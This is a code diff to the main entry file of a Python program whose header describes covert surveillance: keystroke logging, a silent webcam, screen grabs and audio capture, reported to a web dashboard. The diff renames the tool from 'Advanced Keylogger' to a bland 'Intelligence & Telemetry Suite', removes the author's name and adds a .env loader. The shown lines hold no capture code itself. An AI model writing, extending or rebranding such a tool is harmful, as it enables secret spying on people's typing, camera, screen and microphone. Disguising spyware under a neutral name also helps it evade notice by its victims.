@@ -1,9 +1,9 @@
 """
 ===================================================================
-Program: Advanced Keylogger & Intelligence Suite
-Author: Avi
+Program: DarkWatch - Intelligence & Telemetry Suite
+Author: DarkWatch Core
 Date: 2026
-Description: Main entry point for Advanced KeyLogger Engine with
+Description: Main entry point for DarkWatch Engine with
              Active Window Keystroke Logging, Silent WebCamera,
              Screen Grabs, Audio Capture, and Glassmorphism Web Dashboard.
 ===================================================================
@@ -19,10 +19,27 @@ from logger_engine import KeyLoggerEngine
 from dashboard import WebDashboard
 
 
+def load_dotenv_file(filepath=".env"):
+    """Load key-value pairs from .env into os.environ if present."""
+    if os.path.exists(filepath):
+        try:
+            with open(filepath, "r", encoding="utf-8") as f:
+                for line in f:
+                    line = line.strip()
+                    if line and not line.startswith("#") and "=" in line:
+                        k, v = line.split("=", 1)
+                        k = k.strip()
+                        v = v.strip().strip("'\"")
+                        if k and k not in os.environ:
+                            os.environ[k] = v
+        except Exception:
+            pass
+
+
 def main():
+    load_dotenv_file()
     print("=" * 60)
-    print("   ADVANCED KEYLOGGER & INTELLIGENCE SUITE - v2.0")
-    print("   Author: Avi")
+    print("       DARKWATCH - INTELLIGENCE & TELEMETRY SUITE")
     print("=" * 60)
 
     config_path = "config.json"
